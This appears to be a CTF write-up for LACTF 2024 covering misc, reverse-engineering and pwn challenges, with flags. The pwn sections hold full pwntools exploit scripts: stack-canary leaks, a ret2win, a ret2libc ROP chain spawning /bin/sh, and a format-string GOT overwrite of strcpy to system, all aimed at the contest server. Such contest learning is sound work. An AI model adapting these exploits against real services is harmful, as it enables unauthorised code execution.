# LACTF2024

## Table of Contents
- [misc/infinite loop](#miscinfinite-loop)
- [misc/mixed signals](#miscmixed-signals)
- [misc/closed](#miscclosed)
- [rev/shattered memories](#revshattered-memories)
- [rev/aplet321](#revaplet321)
- [rev/the secret of java island](#revthe-secret-of-java-island)
- [pwn/aplet123](#pwnaplet123)
- [pwn/52 card monty](#pwn52-card-monty)
- [pwn/sus](#pwnsus)
- [pwn/pizza](#pwnpizza)

## Misc/Infinite Loop

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/70683b49-1cb9-40e3-8859-f4626eb68b29)

A google form challenge where it constantly loops and brings you back to the same page. Click on inspect source and search for the string "lactf" will reveal the flag.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/8cb5b24d-ea52-4432-b0d5-2ee13e8a5947)

## Misc/Mixed Signals

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/18970d3f-026d-447d-bb12-22e1a0a9b1b8)

The authors accidentally uploaded the wrong file so we could hear the flag directly just by playing the video. Just replace the phonetic alphabets (eg: Alpha = A, Bravo = B, Charie = C)

## Misc/Closed

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/4717d495-bce0-44d2-815c-be23542e1e48)

### Image given : 

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a12b5b1d-8787-479a-8344-620d1e4560a7)

From the image above, we can deduce that this location is in California and its located next to a big body of water.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/3f0b9777-ef5c-4f96-83d8-d062ba10f72c)

On closer inspection, we can see words which I can only assume is "Shore Trail". So I used the app AllTrails and searched for the term "Shore Trail California". The results show that there is a East Shore Trail, West Shore Trail and South Shore Trail. So I immediately went to Google Maps and manually looked at each trail.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c449baf6-4d3e-4db4-99cf-965cbba6a039)

The South Shore Trail looked the most promising.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/97a57776-2ec0-4932-b19a-fc1b2150f27e)

We found the exact rock in the picture. Clicking on the bottom left corner of the rock gave us the coordinates

> Flag : lactf{36.516,-121.949}

## Rev/Shattered Memories

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/50152667-d4ed-44e9-81a1-a39c85146872)

```
strings shattered-memories      
What was the flag again?
No, I definitely remember it being a different length...
t_what_f
t_means}
nd_forge
lactf{no
orgive_a
No, that definitely isn't it.
```

Just run strings on it and reassemble the flag.

## Rev/Aplet321

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a7153847-f008-4075-a2ec-ce09869d8dd5)

<details>
<summary>Decompiled Code</summary>

	```c
 		    do {
	      iVar1 = strncmp(pcVar3,"pretty",6);
	      NumOfPretty = NumOfPretty + (uint)(iVar1 == 0);
	      iVar1 = strncmp(pcVar3,"please",6);
	      NumOfPlease = NumOfPlease + (uint)(iVar1 == 0);
	      pcVar3 = pcVar3 + 1;
	    } while (pcVar3 != acStack_237 + ((int)sVar2 - 6));
	    if (NumOfPlease != 0) {
	      pcVar3 = strstr(&local_238,"flag");
	      if (pcVar3 == (char *)0x0) {
	        puts("sorry, i didn\'t understand what you mean");
	        return 0;
	      }
	      if ((NumOfPretty + NumOfPlease == 0x36) && (NumOfPretty - NumOfPlease == -0x18)) {
	        puts("ok here\'s your flag");
	        system("cat flag.txt");
	        return 0;
	      }
 	```
</details>

The program will print out the flag if we say "pretty" 15 times, "please" 39 times and "flag".

```python
prettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettypleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseflag
```

> Flag : lactf{next_year_i'll_make_aplet456_hqp3c1a7bip5bmnc}

## Rev/The Secret of Java Island

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/241f0499-e9ac-4cdd-89d7-da1bcadb2901)

We are provided with a jar file

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/415ce8fa-abdd-48af-877b-39c27ce5a431)

Looks like its a choice-driven game when running the program. Decompile the jar file using a [online decompiler](https://www.decompiler.com/).

From the decompiled code, the game moves from state to state depending on the choices we make.

{% highlight java %}
 case 5:
         try {
            Socket var0 = new Socket("chall.lac.tf", 31151);
            String var1 = "";

            int var3;
            for(Iterator var2 = history.iterator(); var2.hasNext(); var1 = var1 + var3) {
               var3 = (Integer)var2.next();
            }

            var0.getOutputStream().write((var1 + "\n").getBytes("UTF-8"));
            Scanner var5 = new Scanner(var0.getInputStream());
            String var6 = var5.nextLine();
            story.setText(var6);
            var5.close();
            var0.close();
         } catch (Exception var4) {
            System.err.println(var4.getMessage());
            story.setText("<html>The flag is garbled and unreadable. Contact an admin if you haven't done anything out of the ordinary.</html>");
         }

         button1.setText("Leave");
         button2.setText("Leave");
         break;
{% endhighlight %}

State 5 prints out the flag so this should be our end goal.

{% highlight java %}
      case 3:
         if (!hasGlove) {
            System.exit(0);
         } else {
            state = 5;
         }
{% endhighlight %}

For us to reach state 5, we will need to be in state 3 and hasGlove must be true. 

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/805c1736-a729-42f3-9368-811f4734ffeb)

I wrote down all the conditions on a piece of paper to visualize it

{% highlight java %}
case 4:
         if (var0 == 0) {
            exploit = exploit + "d";
            story.setText("You clobbered the DOM. That was exploit #" + exploit.length() + ".");
         } else {
            exploit = exploit + "p";
            story.setText("You polluted the prototype. That was exploit #" + exploit.length() + ".");
         }

         if (exploit.length() == 8) {
            try {
               MessageDigest var1 = MessageDigest.getInstance("SHA-256");
               if (!Arrays.equals(var1.digest(exploit.getBytes("UTF-8")), new byte[]{69, 70, -81, -117, -10, 109, 15, 29, 19, 113, 61, -123, -39, 82, -11, -34, 104, -98, -111, 9, 43, 35, -19, 22, 52, -55, -124, -45, -72, -23, 96, -77})) {
                  state = 7;
               } else {
                  state = 6;
               }

               updateGame();
            } catch (Exception var2) {
               throw new RuntimeException(var2);
            }
         }

         return;
{% endhighlight %}

We need to go to state 6 to set hasGlove to True and to do that, we need to first bypass state 4 which hashes the string variable when its length is 8 and compares it to a hardcoded hash. We need to figure out the sequence of exploit to pass this check. Luckily, the length of the string is only 8 so there are only 256 possible permutations of "dddddddd" to "pppppppp". I made ChatGPT create a java program to bruteforce it.

### Hash Crack Script

{% highlight java %}
package backup;
import java.security.MessageDigest;
import java.util.Arrays;

public class omg {
    private static final byte[] EXPECTED_HASH = {69, 70, -81, -117, -10, 109, 15, 29, 19, 113, 61, -123, -39, 82, -11, -34, 104, -98, -111, 9, 43, 35, -19, 22, 52, -55, -124, -45, -72, -23, 96, -77};

    public static void generateCombinations(int length) {
        String[] options = {"d", "p"};

        for (int i = 0; i < Math.pow(2, length); i++) {
            StringBuilder combination = new StringBuilder();
            for (int j = length - 1; j >= 0; j--) {
                int bit = (i >> j) & 1;
                combination.append(options[bit]);
            }
            if (checkHash(combination.toString())) {
                System.out.println("Matching combination found: " + combination);
            }
        }
    }

    private static boolean checkHash(String combination) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(combination.getBytes("UTF-8"));
            return Arrays.equals(hash, EXPECTED_HASH);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void main(String[] args) {
        int length = 8;
        generateCombinations(length);
    }
}
{% endhighlight %}

The matching combination was "dpddpdpp". With that, we have everything we need

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/eb85b60b-fd73-4065-a243-b93b42e5bf7d)

## Pwn/Aplet123

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/34702286-9d84-4765-98c8-aba4cf0857d6)

### Source Code

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {"L",
                                 "amongus",
                                 "true",
                                 "pickle",
                                 "GINKOID",
                                 "L bozo",
                                 "wtf",
                                 "not with that attitude",
                                 "increble",
                                 "based",
                                 "so true",
                                 "monka",
                                 "wat",
                                 "monkaS",
                                 "banned",
                                 "holy based",
                                 "daz crazy",
                                 "smh",
                                 "bruh",
                                 "lol",
                                 "mfw",
                                 "skissue",
                                 "so relatable",
                                 "copium",
                                 "untrue!",
                                 "rolled",
                                 "cringe",
                                 "unlucky",
                                 "lmao",
                                 "eLLe",
                                 "loser!",
                                 "cope",
                                 "I use arch btw"};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
{% endhighlight %}

We immediately notice the use of gets() so theres a buffer overflow. 

```python
└─$ checksec --file=aplet123
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols        No    0               3               aplet123
```

There is a stack canary so we will need to find a way to leak the canary.

Looking at the source code, the only way we can get a leak is by the printf(). First, I tried to completely fill the buffer until the canary so that the canary will be leaked out with it but that didnt work because the least signifcant bit (LSB) of the canary is a null byte so the print will just stop at the \x00.

```python
p.sendlineafter(b"hello\n", "A"*69 + "i'm")   # Note : the actual size of the buffer is 72, eventhough the source code said 64
```

We will modify our payload to add "i'm" at the end to take advantage of the s+4 behaviour

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/557d3836-2a5f-4b3a-b763-f5e378e7d97a)

Now that we have a canary leak, we can just use the buffer overflow to overwrite the saved return address to print_flag()

### Exploit Script

{% highlight python %}
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./aplet123')

host = "chall.lac.tf"
port = 31123

gdb_script = '''

'''

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

leak_canary_offset = 69
offset = 72
win = 0x004011e6

p.sendlineafter(b"hello\n", "A"*leak_canary_offset + "i'm")
p.recvuntil(b"hi ")
leak = p.recv(7)
leak = b"\x00" + leak
canary = u64(leak)

payload = b"A" * offset
payload += p64(canary) * 2
payload += p64(win)

p.sendlineafter(b"aplet123\n", payload)
p.sendline("bye")

p.interactive()

# lactf{so_untrue_ei2p1wfwh9np2gg6} 

{% endhighlight %}

## Pwn/52 Card Monty

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/04046e49-dccc-4253-af8f-efa93b818930)

### Source Code

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define DECK_SIZE 0x52
#define QUEEN 1111111111

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  srand(time(NULL));
}

void win() {
  char flag[256];

  FILE *flagfile = fopen("flag.txt", "r");

  if (flagfile == NULL) {
    puts("Cannot read flag.txt.");
  } else {
    fgets(flag, 256, flagfile);
    flag[strcspn(flag, "\n")] = '\0';
    puts(flag);
  }
}

long lrand() {
  long higher, lower;
  higher = (((long)rand()) << 32);
  lower = (long)rand();
  return higher + lower;
}

void game() {
  int index;
  long leak;
  long cards[52] = {0};
  char name[20];

  for (int i = 0; i < 52; ++i) {
    cards[i] = lrand();
  }

  index = rand() % 52;
  cards[index] = QUEEN;

  printf("==============================\n");

  printf("index of your first peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 1: %lu\n", cards[0]);

  printf("==============================\n");

  printf("index of your second peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 2: %lu\n", cards[0]);

  printf("==============================\n");

  printf("Show me the lady! ");
  scanf("%d", &index);

  printf("==============================\n");

  if (cards[index] == QUEEN) {
    printf("You win!\n");
  } else {
    printf("Just missed. Try again.\n");
  }

  printf("==============================\n");

  printf("Add your name to the leaderboard.\n");
  getchar();
  printf("Name: ");
  fgets(name, 52, stdin);

  printf("==============================\n");

  printf("Thanks for playing, %s!\n", name);
}

int main() {
  setup();
  printf("Welcome to 52-card monty!\n");
  printf("The rules of the game are simple. You are trying to guess which card "
         "is correct. You get two peeks. Show me the lady!\n");
  game();
  return 0;
}
{% endhighlight %}

We have an Out-Of-Bound read because the deck size is 52 while it checks to make sure the index we provide is within 0x52 (82 in decimal). Additionally, there is a BOF and win function inside.

```python
└─$ checksec --file=monty 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols        No    0               2               monty
```

PIE and stack canary is enabled. With the 2 leaks that we can get, its clear that we should leak the canary and elf address. After looking around in gdb, we have determined that the canary is located at index 55 and we can get an elf leak at index 57.

### Exploit Script

{% highlight python %}
#!/usr/bin/python
from pwn import *
import warnings

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./monty')

host = "chall.lac.tf"
port = 31132

gdb_script = '''

'''

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

canary_leak_offset = 55
elf_leak_offset = 57

p.sendlineafter(b"peek? ", str(canary_leak_offset))
p.recvuntil(b"Peek 1: ")
canary = int(p.recvline().strip().decode())
log.info(f"Canary leak : {hex(canary)}")

p.sendlineafter(b"peek? ", str(elf_leak_offset))
p.recvuntil(b"Peek 2: ")
elf_leak = int(p.recvline().strip().decode())
elf_leak = elf_leak - (0x0055555555567E - 0x00555555554000)
log.info(f"Elf leak : {hex(elf_leak)}")
exe.address = elf_leak
win = exe.sym["win"]
log.info(f"Win : {hex(win)}")

payload = b"A"*24
payload += p64(canary)*2
payload += p64(win)

p.sendlineafter(b"lady! ", "1")
p.sendlineafter(b"Name: ", payload)

p.interactive()
{% endhighlight %}

> Flag : lactf{m0n7y_533_m0n7y_d0}

## Pwn/Sus

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c2483fba-441e-420a-9f16-a6fdddafe1e7)

### Source Code

{% highlight c %}
#include <stdio.h>

void sus(long s) {}

int main(void) {
  setbuf(stdout, NULL);
  long u = 69;
  puts("sus?");
  char buf[42];
  gets(buf);
  sus(u);
}
{% endhighlight %}

Theres not much going on in this binary. Theres no win function that we can return to with the buffer overflow so we will probably need a libc leak. Since PIE is disabled, we can overwrite the return address with the PLT address of puts() with the GOT address of any function as the argument.

Heres a short explanation of the Global Offset Table (GOT) and Procedure Linkage Table (PLT)
> The GOT table contains the address of functions while the PLT is used to resolve function calls. When a function is called for the first time in a program, it will first call the PLT entry of that function, which will resolve the function call and the address of the function is saved into the GOT. On future calls to this same function, it will use the address inside the GOT.

So when we call the PLT address of puts(), its the same as directly calling the function puts(). And when we give the GOT address of any function (e.g. gets) as argument, it will call puts() on the address of the argument.

In my script, I will leak the GOT address of gets(). Now the problem is, how do we pass the GOT address of gets() as an argument without pop_rdi gadget in the binary? Thats where the sus() function comes in. The sus() function takes the variable u as an argument (it would pop the value of u into rdi in assembly). Since we also have an overflow, we can modify the content of u and control what is popped into the rdi.

{% highlight python %}
payload = b"A" * 56
payload += p64(getsGot) * 2         # overwrite u with the GOT address of gets
payload += p64(putsPlt)             # call puts()
payload += p64(mainSym)             # return back to main to trigger BOF again

p.sendlineafter(b"sus?\n", payload)
leak = p.recvline().strip().ljust(8, b"\x00")
leak = u64(leak)
log.info(f"Gets leak : {hex(leak)}")

payload = b"A" * 56
payload += p64(putsGot) * 2      # overwrite u with the GOT address of puts
payload += p64(putsPlt)          # call puts()
payload += p64(mainSym)          # return back to main to trigger BOF again

p.sendlineafter(b"sus?\n", payload)
leak = p.recvline().strip().ljust(8, b"\x00")
leak = u64(leak)
log.info(f"Puts leak : {hex(leak)}")
{% endhighlight %}

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/2e405863-ea53-4fe8-9be5-604b118dec21)

Now that we have leaked the address of a function in libc, its time to find the version of libc that is running on the server using this [tool](https://libc.blukat.me/?q=gets%3A090%2Cputs%3A980)

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/8e31443d-861c-4716-9a19-5bb5b3696c7e)

Download any of the libc versions to test. Now that we have the correct version, we can calculate the base of libc by attaching gdb to it and run "vmmap" to see the base of libc. With that, we have all the information we need to trigger a ret2system.

### Exploit Script

{% highlight python %}
#!/usr/bin/python
from pwn import *
import warnings

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./sus_patched')
libc = ELF('./libc6_2.36-9+deb12u4_amd64.so')

host = "chall.lac.tf"
port = 31284

gdb_script = '''
b *main+70
c
'''

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./sus', gdbscript = gdb_script)

putsGot = exe.got["puts"]
getsGot = exe.got["gets"]
putsPlt = exe.plt["puts"]
mainSym = exe.sym["main"]

payload = b"A" * 56
payload += p64(getsGot) * 2
payload += p64(putsPlt)
payload += p64(mainSym)

p.sendlineafter(b"sus?\n", payload)
leak = p.recvline().strip().ljust(8, b"\x00")
leak = u64(leak)
log.info(f"Gets leak : {hex(leak)}")

#payload = b"A" * 56
#payload += p64(putsGot) * 2
#payload += p64(putsPlt)
#payload += p64(mainSym)

#p.sendlineafter(b"sus?\n", payload)
#leak = p.recvline().strip().ljust(8, b"\x00")
#leak = u64(leak)
#log.info(f"Puts leak : {hex(leak)}")

#gdb.attach(p)
libc.address = leak - (0x007f49f983e090 - 0x007f49f97c7000)
log.info(f"Libc base : {hex(libc.address)}")

pop_rdi = libc.address + 0x00000000000277e5
ret = pop_rdi + 1
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
log.info(f"Pop rdi : {hex(pop_rdi)}")
log.info(f"System : {hex(system)}")
log.info(f"Binsh : {hex(binsh)}")

payload = b"A" * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b"sus?\n", payload)

p.interactive()
{% endhighlight %}

> Flag : lactf{amongsus_aek7d2hqhgj29v21}

## Pwn/Pizza

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/f02ed5bf-381d-4393-8e66-56cd0d949531)

### Source Code

{% highlight c %}
#include <stdio.h>
#include <string.h>

const char *available_toppings[] = {"pepperoni",  "cheese",     "olives",
                                    "pineapple",  "apple",      "banana",
                                    "grapefruit", "kubernetes", "pesto",
                                    "salmon",     "chopsticks", "golf balls"};
const int num_available_toppings =
    sizeof(available_toppings) / sizeof(available_toppings[0]);

int main(void) {
  setbuf(stdout, NULL);
  printf("Welcome to kaiphait's pizza shop!\n");
  while (1) {
    printf("Which toppings would you like on your pizza?\n");
    for (int i = 0; i < num_available_toppings; ++i) {
      printf("%d. %s\n", i, available_toppings[i]);
    }
    printf("%d. custom\n", num_available_toppings);
    char toppings[3][100];
    for (int i = 0; i < 3; ++i) {
      printf("> ");
      int choice;
      scanf("%d", &choice);
      if (choice < 0 || choice > num_available_toppings) {
        printf("Invalid topping");
        return 1;
      }
      if (choice == num_available_toppings) {
        printf("Enter custom topping: ");
        scanf(" %99[^\n]", toppings[i]);
      } else {
        strcpy(toppings[i], available_toppings[choice]);
      }
    }
    printf("Here are the toppings that you chose:\n");
    for (int i = 0; i < 3; ++i) {
      printf(toppings[i]);
      printf("\n");
    }
    printf("Your pizza will be ready soon.\n");
    printf("Order another pizza? (y/n): ");
    char c;
    scanf(" %c", &c);
    if (c != 'y') {
      break;
    }
  }
}
{% endhighlight %}

Theres a format string vulnerability when we enter a custom topping.

```python
└─$ checksec --file=pizza 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   44 Symbols        No    0               2               pizza
```

Since there is Partial RELRO, the first thing that came to my mind was a GOT overwrite attack. We will overwrite the GOT address of a function to system() address. Additionally, I assume that the libc for this challenge is the same as the previous challenge (pwn/sus) so I just copied it over.

For a GOT overwrite attack, we will need a leak to the elf base and libc. To do this, we will pass n "%p" to printf to leak addresses from the stack. Then, we can pass in "%1$p%2$p......$50$p" to continue leaking the next address in the stack up to %50$p (this means something like the 50th item on the stack). Eventually we will find a libc and elf address. In my case, I found a libc address at %5$p and an elf address at $49$p.

{% highlight python %}
format1 = "AAAA.%5$p"
format2 = ".%49$p"

custom(format1)
custom(format2)
custom("aaaa")

p.recvline()
top1 = p.recvline().strip().decode().split(".")
top2 = p.recvline().strip().decode().split(".")
top3 = p.recvline().strip()

leak = int(top1[-1], 16)
log.info(f"libc leak : {hex(leak)}")
libc.address = leak - (0x7f2a1da6ba80-0x7f2a1d899000)
log.info(f"libc base : {hex(libc.address)}")

leak = int(top2[-1], 16)
log.info(f"elf leak : {hex(leak)}")
exe.address = leak - (0x56113f613189 - 0x0056113f612000)
log.info(f"elf base : {hex(exe.address)}")
{% endhighlight %}

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/4d593224-9392-4a95-ba0a-9c2694b22e7d)

Then, we need to look for a good target to overwrite its GOT into system. strcpy() looks like a good target because I can enter /bin/sh into the topping and call strcpy() on /bin/sh which is the same as system("/bin/sh")

{% highlight python %}
offset = 6
payload = fmtstr_payload(offset, {strcpyGot:systemSym})
#print(len(payload))
print(payload)
assert(len(payload) < 100)
custom(payload)
{% endhighlight %}

We can send the payload and get a shell

### Exploit Script

{% highlight python %}
#!/usr/bin/python
from pwn import *
import warnings

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./pizza_patched')
libc = ELF('./libc6_2.36-9+deb12u4_amd64.so')
#libc = exe.libc

host = "chall.lac.tf"
port = 31134

gdb_script = '''
c
'''

def custom(data):
	p.sendlineafter(b"> ", "12")
	p.sendlineafter(b"topping: ", data)


#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./pizza_patched', gdbscript = gdb_script)

format1 = "AAAA.%5$p"
format2 = ".%49$p"

custom(format1)
custom(format2)
custom("aaaa")


p.recvline()
top1 = p.recvline().strip().decode().split(".")
top2 = p.recvline().strip().decode().split(".")
top3 = p.recvline().strip()

leak = int(top1[-1], 16)
log.info(f"libc leak : {hex(leak)}")
libc.address = leak - (0x7f2a1da6ba80-0x7f2a1d899000)
log.info(f"libc base : {hex(libc.address)}")

leak = int(top2[-1], 16)
log.info(f"elf leak : {hex(leak)}")
exe.address = leak - (0x56113f613189 - 0x0056113f612000)
log.info(f"elf base : {hex(exe.address)}")

strcpyGot = exe.got["strcpy"]
systemSym = libc.sym["system"]
log.info(f"strcpy got : {hex(strcpyGot)}")
log.info(f"system : {hex(systemSym)}")

p.sendlineafter(b"(y/n): ", "y")

offset = 6
payload = fmtstr_payload(offset, {strcpyGot:systemSym})
#print(len(payload))
print(payload)
assert(len(payload) < 100)
custom(payload)
custom("0")
custom("0")
p.sendlineafter(b"(y/n): ", "y")
custom("/bin/sh")
custom("/bin/sh")
custom("/bin/sh")
p.sendlineafter(b"(y/n): ", "y")
p.sendlineafter(b"> ", "0")


#gdb.attach(p)
p.interactive()
#lactf{golf_balls_taste_great_2tscx63xm3ndvycw}
{% endhighlight %}

### Disclaimer

My script doesnt work 100% of the time, or rather, it only works 1% of the time. Firstly, its because the format string payload length is more than 100, but the program only takes in 100 characters as input. Secondly, Im not really sure whats happening, but I assume something is not aligning properly. So, for my script to work, the length of the payload must be < 100 and the internal things must align properly. I could spend time debugging the script and "try" to figure out whats wrong, but when I was solving this challenge, I was tired and didnt bother doing so. I just kept running the script until it eventually works.

Heres proof so you dont think I'm crazy lol

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/234483ac-d124-45e4-ab6e-39f935b83808)
